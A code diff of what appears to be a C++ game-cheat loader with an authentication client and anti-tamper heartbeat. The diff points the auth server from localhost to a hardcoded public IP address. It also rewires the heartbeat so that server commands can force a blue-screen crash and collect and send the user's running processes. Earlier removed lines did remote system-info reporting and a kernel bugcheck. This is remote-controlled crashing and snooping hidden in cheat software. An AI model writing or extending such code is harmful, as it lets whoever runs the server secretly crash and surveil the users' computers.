@@ -399,7 +399,7 @@ namespace fs = std::filesystem;
 //  Change AUTH_SERVER_HOST to your server's IP/hostname.
 //  Change AUTH_SERVER_PORT to match your server.py port.
 // ═══════════════════════════════════════════════════════════════════
-static std::string AUTH_SERVER_HOST = E("localhost");
+static std::string AUTH_SERVER_HOST = E("73.137.88.21");
 static int         AUTH_SERVER_PORT = 7777;
 // ═══════════════════════════════════════════════════════════════════
 
@@ -1526,7 +1526,7 @@ int main() {
         return 1;
     }
 
-    // Heartbeat thread — keeps session alive + runs periodic tamper checks + kill/monitor/bsod handler
+    // Heartbeat thread — keeps session alive + runs periodic tamper checks + kill handler
     std::thread heartbeatThread([&auth]() {
         antitamper::RegisterThread(GetCurrentThreadId());
         Sleep(5000);
@@ -1542,17 +1542,14 @@ int main() {
                 return; // never reached
             }
             if (hbResult == 3) {
-                // Monitor command — collect and report system info
-                try { auth.report_system_info(); } catch (...) {}
-                Sleep(10000);
-                continue;
+                // BSOD command received — trigger blue screen
+                SelfAuth::api::TriggerBSOD();
+                return; // never reached
             }
             if (hbResult == 4) {
-                // BSOD command — trigger kernel bugcheck
-                auth.TriggerBSOD();
-                // If BSOD failed (driver not loaded), fall through
-                Sleep(10000);
-                continue;
+                // Process report requested — collect and send
+                auth.ReportProcesses();
+                continue; // don't treat as error, keep heartbeat alive
             }
             if (hbResult != 0) {
                 // Session dead — kill the cheat
